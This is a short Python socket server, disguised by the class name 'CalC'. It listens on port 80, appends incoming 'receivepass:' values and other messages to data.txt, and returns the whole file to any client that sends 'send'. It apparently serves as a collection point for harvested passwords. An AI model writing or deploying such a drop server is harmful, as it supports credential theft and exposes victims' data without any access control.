import socket
import re
class CalC:
 
 def SocketSocket(self):
  a=""
  s = socket.socket()
  port = 80
  s.bind(('', port))
  s.listen(5)
  while True :
   c, addr = s.accept()
   print ("Received request from:",addr)
   b= c.recv(1024).decode()
   if b=="send" :
    d=open("data.txt","r")
    for x in d:
     x.strip()
     a=a+x 
    d.close()
    c.send(a.encode());
    a=""
    c.close()
   elif re.search('^receivepass:.*',b):
    bbbb=b[12:]
    k=open("data.txt","a")
    l="\nxpxp:{0}".format(bbbb)
    k.write(l)
    k.close()
   else :
    g=open("data.txt","a")
    h="\nxuxu:{0}".format(b)
    g.write(h)
    g.close()
A=CalC()
A.SocketSocket()